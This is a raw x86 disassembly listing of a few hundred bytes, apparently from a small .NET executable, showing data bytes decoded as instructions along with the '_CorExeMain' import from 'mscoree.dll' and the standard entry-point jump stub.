  40d037:	05 08 08 06 00       	add    $0x60808,%eax
  40d03c:	02 07                	add    (%edi),%al
  40d03e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d043:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d04a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d050:	00 02                	add    %al,(%edx)
  40d052:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d058:	02 0b                	add    (%ebx),%cl
  40d05a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d05f:	02 06                	add    (%esi),%al
  40d061:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d066:	02 0a                	add    (%edx),%cl
  40d068:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d06d:	03 12                	add    (%edx),%edx
  40d06f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d076:	07 02 12 
  40d079:	60                   	pusha
  40d07a:	02 04 07             	add    (%edi,%eax,1),%al
  40d07d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d083:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d088:	04 1d                	add    $0x1d,%al
  40d08a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d08f:	06                   	push   %es
  40d090:	07                   	pop    %es
  40d091:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d097:	00 01                	add    %al,(%ecx)
  40d099:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d09e:	06                   	push   %es
  40d09f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d0a5:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d0ab:	05 08 20 02 01       	add    $0x1022008,%eax
  40d0b0:	12 61 11             	adc    0x11(%ecx),%ah
  40d0b3:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d0b7:	04 12                	add    $0x12,%al
  40d0b9:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d0c0:	1d 05 00 
  40d0c3:	00 ec                	add    %ch,%ah
  40d0c5:	d0 00                	rolb   $1,(%eax)
	...
  40d0cf:	00 0e                	add    %cl,(%esi)
  40d0d1:	d1 00                	roll   $1,(%eax)
  40d0d3:	00 00                	add    %al,(%eax)
  40d0d5:	20 00                	and    %al,(%eax)
	...
  40d0eb:	00 00                	add    %al,(%eax)
  40d0ed:	d1 00                	roll   $1,(%eax)
	...
  40d0ff:	00 00                	add    %al,(%eax)
  40d101:	00 5f 43             	add    %bl,0x43(%edi)
  40d104:	6f                   	outsl  %ds:(%esi),(%dx)
  40d105:	72 45                	jb     0x40d14c
  40d107:	78 65                	js     0x40d16e
  40d109:	4d                   	dec    %ebp
  40d10a:	61                   	popa
  40d10b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d112:	72 65                	jb     0x40d179
  40d114:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d118:	6c                   	insb   (%dx),%es:(%edi)
  40d119:	00 00                	add    %al,(%eax)
  40d11b:	00 00                	add    %al,(%eax)
  40d11d:	00 ff                	add    %bh,%bh
  40d11f:	25 00 20 40 00       	and    $0x402000,%eax
